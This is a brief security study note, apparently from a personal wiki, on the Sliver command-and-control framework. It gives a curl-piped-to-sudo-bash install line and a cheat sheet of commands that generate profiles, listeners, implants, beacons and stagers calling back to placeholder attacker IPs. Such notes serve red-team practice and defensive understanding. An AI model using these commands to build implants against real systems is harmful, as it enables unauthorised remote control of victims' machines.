---
tags:
  - security
---
A [[Command and Control Server|C2]] that is open source created by [[Bishop Fox]].
![[Sliver-20260508025211814.webp]]
# Installation
```
curl https://sliver.sh/install | sudo bash
```
# Usage
`sliver` to open up the prompt
### Create Profile
```
profiles new --mtls <attackerboxip> --format shellcode profilename
```
### Create Listener
```
stage-listener --url http://<attackerboxip>:port --profile profilename
```
### Create [[C2 Implant]]
```
generate -b <attackerip> --os linux --skip-symbols
```
### Generate [[C2 Beacon]]
```
generate beacon -b <attackerip> --skip-symbols --debug -j 10 -s test --os windows
```
- 10s of [[Jitter]]
### Generate [[C2 Session]]
### View Implants
```
implants
```
### Create [[Stager]]
```
generate-stager --lhost <attackerip> --lport <listenerport> --protocol http --save /tmp
```